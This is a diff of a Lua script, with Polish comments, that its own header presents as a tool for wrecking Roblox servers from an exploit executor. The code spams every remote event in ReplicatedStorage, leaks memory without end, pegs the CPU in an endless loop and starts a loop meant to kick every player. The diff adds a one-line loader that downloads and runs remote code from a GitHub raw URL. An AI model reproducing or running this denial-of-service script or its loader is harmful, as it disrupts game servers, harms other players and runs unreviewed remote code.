@@ -1,9 +1,12 @@
 --[[
-    ROZDUPIATORHUB – skrypt do niszczenia serwera Roblox przez Xeno
-    Użycie: uruchom w executorze.
+    Link do łatwego uruchamiania:
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/Plakalhub/rozdupiator/refs/heads/main/PlakalHub.lua'))()
+
+    ROZDUPIATORHUB – niszczenie serwera
+    Użycie: wklej powyższą linijkę w executorze.
 ]]
 
--- Funkcja spamująca zdarzeniami zdalnymi
+-- spam zdarzeniami zdalnymi
 local function spamZdalne()
     local repStorage = game:GetService("ReplicatedStorage")
     for _, obiekt in ipairs(repStorage:GetChildren()) do
@@ -19,7 +22,7 @@ local function spamZdalne()
     end
 end
 
--- Funkcja przeciążająca pamięć (tworzenie tysięcy obiektów)
+-- wyciek pamięci (lag)
 local function wyciekPamieci()
     local czesci = {}
     while true do
@@ -30,7 +33,7 @@ local function wyciekPamieci()
     end
 end
 
--- Funkcja zamrażająca wątki (nieskończona pętla)
+-- zapętlenie (obciążenie CPU)
 local function zapetlenie()
     local x = 0
     while true do
@@ -39,12 +42,12 @@ local function zapetlenie()
     end
 end
 
--- Uruchomienie ataków
+-- start ataków
 spawn(spamZdalne)
 spawn(wyciekPamieci)
 spawn(zapetlenie)
 
--- Blokowanie graczy (wyrzucanie)
+-- kick wszystkich graczy
 task.wait(0.5)
 spawn(function()
     while true do
